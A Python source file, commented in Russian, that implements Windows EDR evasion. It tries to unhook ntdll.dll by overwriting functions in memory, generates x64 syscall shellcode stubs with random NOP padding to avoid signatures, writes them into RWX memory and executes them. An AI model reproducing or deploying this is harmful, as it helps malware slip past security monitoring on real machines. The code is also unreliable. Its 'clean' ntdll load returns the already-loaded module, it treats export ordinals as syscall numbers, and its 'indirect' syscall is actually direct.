# -*- coding: utf-8 -*-
import ctypes
import logging
import struct
import pefile

class SyscallHider:
    def __init__(self):
        """Инициализация механизма скрытия системных вызовов"""
        self.logger = self._setup_logger()
        self.kernel32 = ctypes.windll.kernel32
        self.ntdll = ctypes.windll.ntdll

    def _setup_logger(self):
        """Настройка логирования"""
        logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
        return logging.getLogger("SyscallHider")

    def unhook_ntdll(self):
        """Удаление хуков с ntdll.dll (API Unhooking)"""
        self.logger.info("🚀 Начинаем API Unhooking...")

        # Загружаем текущую модифицированную ntdll
        h_ntdll = self.kernel32.LoadLibraryA(b"ntdll.dll")
        if not h_ntdll:
            raise RuntimeError("❌ Ошибка загрузки ntdll.dll из памяти")

        # Пробуем загрузить чистую ntdll.dll
        clean_ntdll_path = b"C:\\Windows\\System32\\ntdll.dll"
        self.logger.info(f"📄 Пробуем загрузить {clean_ntdll_path.decode()}")
        h_clean_ntdll = self.kernel32.LoadLibraryA(clean_ntdll_path)

        if not h_clean_ntdll:
            raise RuntimeError("❌ Ошибка загрузки чистого ntdll.dll")

        self.logger.info("✅ Чистая ntdll.dll загружена успешно!")

        # Перезаписываем функции в памяти
        functions = [b"NtQuerySystemInformation", b"NtAllocateVirtualMemory", b"NtProtectVirtualMemory"]
        for func in functions:
            original_func = self.kernel32.GetProcAddress(h_clean_ntdll, func)
            hooked_func = self.kernel32.GetProcAddress(h_ntdll, func)

            if original_func and hooked_func:
                size = 32
                old_protect = ctypes.c_ulong()
                self.kernel32.VirtualProtect(hooked_func, size, 0x40, ctypes.byref(old_protect))
                ctypes.memmove(hooked_func, original_func, size)
                self.kernel32.VirtualProtect(hooked_func, size, old_protect.value, ctypes.byref(old_protect))

                self.logger.info(f"✅ Успешно очистили хук: {func.decode()}")

        self.logger.info("✅ API Unhooking завершен.")

    def get_syscall_index(self, syscall_name):
        """Получение индекса системного вызова через анализ ntdll.dll"""
        self.logger.info(f"🔍 Получаем индекс системного вызова: {syscall_name}")

        h_ntdll = self.kernel32.GetModuleHandleA(b"ntdll.dll")
        if not h_ntdll:
            self.logger.error("❌ Ошибка: не удалось получить дескриптор ntdll.dll")
            raise RuntimeError("Ошибка получения дескриптора ntdll.dll")

        self.logger.info(f"✅ Дескриптор ntdll.dll: {hex(h_ntdll)}")

        syscall_number = self.get_syscall_id_via_pe("C:\\Windows\\System32\\ntdll.dll", syscall_name)
        if syscall_number:
            self.logger.info(f"✅ Syscall {syscall_name} -> индекс {syscall_number}")
            return syscall_number

        func_addr = self.kernel32.GetProcAddress(h_ntdll, syscall_name.encode())
        if func_addr:
            self.logger.info(f"✅ Адрес {syscall_name}: {hex(func_addr)}")
            syscall_number = ctypes.c_ushort()
            ctypes.memmove(ctypes.byref(syscall_number), func_addr + 1, 2)
            self.logger.info(f"✅ Syscall {syscall_name} -> индекс {syscall_number.value}")
            return syscall_number.value

        self.logger.error(f"❌ Не удалось найти {syscall_name}")
        raise RuntimeError(f"Ошибка получения адреса {syscall_name}")

    def get_syscall_id_via_pe(self, ntdll_path, syscall_name):
        """Анализ PE-файла ntdll.dll и поиск системного вызова"""
        pe = pefile.PE(ntdll_path)
        for entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if entry.name and syscall_name.encode() in entry.name:
                return entry.ordinal
        return None

    def generate_syscall_stub(self, syscall_index: int, arch: str = 'x64', morph: bool = False) -> bytes:
        """
        Генерация shellcode-заглушки для системного вызова.
        :param syscall_index: индекс системного вызова (syscall number)
        :param arch: архитектура ('x64', 'wow64')
        :param morph: включить морфинг шаблона (NOP вставки и перестановки)
        :return: байт-код заглушки
        """
        if arch == 'x64':
            # Базовая x64: mov r10, rcx; mov eax, index; syscall; ret
            base = [
                b"\x4c\x8b\xd1",  # mov r10, rcx
                b"\xb8" + syscall_index.to_bytes(4, 'little'),  # mov eax, index
                b"\x0f\x05",       # syscall
                b"\xc3"            # ret
            ]

            if morph:
                import random
                junk = [b"\x90"] * random.randint(1, 4)  # вставка случайных NOP
                order = base[:1] + junk + base[1:]
                return b''.join(order)
            return b''.join(base)

        elif arch == 'wow64':
            # Heaven's Gate (32-bit → 64-bit call через сегмент 0x33)
            raise NotImplementedError("Heaven's Gate not yet implemented")

        else:
            raise ValueError("Unsupported architecture")
    


    def indirect_syscall(self, syscall_index, arg1, arg2, arg3):
        """Выполнение системного вызова через Indirect Syscall"""
        self.logger.info(f"🚀 Выполняем Indirect Syscall {syscall_index}")

        # 🔍 Проверяем реальный syscall_index
        real_index = self.get_syscall_index("NtQuerySystemInformation")
        if real_index != syscall_index:
            self.logger.warning(f"⚠️ Разница между вычисленным ({syscall_index}) и реальным ({real_index}) syscall_index!")

        # ✅ Генерируем shellcode вручную (без struct.pack())
        shellcode = self.generate_syscall_stub(syscall_index, arch='x64', morph=True)
        self.logger.info(f"✅ Сгенерирован shellcode: {shellcode.hex()}, len={len(shellcode)}")

      

        # 📌 Выделение памяти
        ptr = ctypes.c_void_p()
        region_size = ctypes.c_size_t(len(shellcode))
        process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, ctypes.windll.kernel32.GetCurrentProcessId())

        if not process_handle:
            raise RuntimeError("❌ Ошибка: не удалось получить дескриптор процесса")

        # 🔥 Двойная смена защиты памяти
        status = self.ntdll.NtAllocateVirtualMemory(
            process_handle,
            ctypes.byref(ptr),
            0,
            ctypes.byref(region_size),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40  # PAGE_EXECUTE_READWRITE
        )

        if status != 0:
            raise MemoryError(f"❌ Ошибка выделения памяти: Код {hex(status)}, адрес {ptr.value}")

        self.logger.info(f"✅ NtAllocateVirtualMemory выделил память по адресу: {hex(ptr.value)}")

        # Записываем shellcode
        try:
            ctypes.memmove(ptr, shellcode, len(shellcode))
            self.logger.info(f"✅ Shellcode успешно записан!")
        except Exception as e:
            raise RuntimeError(f"❌ Ошибка копирования shellcode: {e}")

        # Меняем сначала на RWX, затем RX
        old_protect = ctypes.c_ulong()
        status = self.ntdll.NtProtectVirtualMemory(
            process_handle,
            ctypes.byref(ptr),
            ctypes.byref(region_size),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect)
        )
        status = self.ntdll.NtProtectVirtualMemory(
            process_handle,
            ctypes.byref(ptr),
            ctypes.byref(region_size),
            0x20,  # PAGE_EXECUTE_READ
            ctypes.byref(old_protect)
        )

        if status != 0:
            raise MemoryError(f"❌ Ошибка установки защиты памяти: Код {hex(status)}")

        self.logger.info(f"✅ Защита памяти изменена на PAGE_EXECUTE_READ")

        # Определяем сигнатуру функции
        func_type = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
        syscall_func = func_type(ptr.value)

        try:
            result = syscall_func(ctypes.c_void_p(arg1), ctypes.c_void_p(arg2), ctypes.c_void_p(arg3))
            self.logger.info(f"✅ Indirect Syscall выполнен, результат: {result}")
            return result
        except Exception as e:
            self.logger.error(f"❌ Ошибка при выполнении Indirect Syscall: {e}")
            raise
    